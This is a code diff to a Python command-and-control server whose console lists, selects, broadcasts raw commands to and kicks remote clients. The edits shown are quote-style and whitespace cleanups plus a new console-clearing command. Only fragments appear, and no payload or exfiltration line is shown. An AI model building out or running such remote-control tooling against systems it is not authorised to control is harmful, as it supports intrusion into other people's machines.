@@ -12,7 +12,7 @@ standard-library `cmd` module.
 Usage (on the EC2 box):
     $ python server/server.py --port 4444
 
-CLI commands:   
+CLI commands:
     list                         Show all active clients
     select <id>                  Choose a client for subsequent send commands
     send <raw command>           Send a single command to selected client
@@ -33,6 +33,7 @@ import sys
 import cmd
 import socket
 import argparse
+import os
 import threading
 from typing import Dict, Tuple, List
 
@@ -222,11 +223,11 @@ def client_read_loop(
             if not data:
                 raise ConnectionResetError()
 
-            decoded = data.decode(errors='ignore')
+            decoded = data.decode(errors="ignore")
 
             # Write to log file
             with LOG_LOCK:
-                with open(LOG_FILE, 'a', encoding='utf-8') as fp:
+                with open(LOG_FILE, "a", encoding="utf-8") as fp:
 
                     # if the data is equal to the buffer size don't add a gap
                     if len(decoded) == buffer:
@@ -297,7 +298,7 @@ class C2Shell(cmd.Cmd):
     def do_list(self, arg: str):  # list
         """This command is used to show the list of clients
         that are currently connected to the server.
-        
+
         Syntax: list
         """
 
@@ -351,6 +352,15 @@ class C2Shell(cmd.Cmd):
         """
         for cid in self.registry.all_ids():
             self._send_to(cid, arg)
+
+    def do_clear(self, arg: str):
+        """
+        Clear the server console screen.
+        Syntax: clear
+        """
+
+        # Windows uses 'cls', Unix uses 'clear'
+        os.system("cls" if os.name == "nt" else "clear")
 
     def do_kick(self, arg: str):
         """
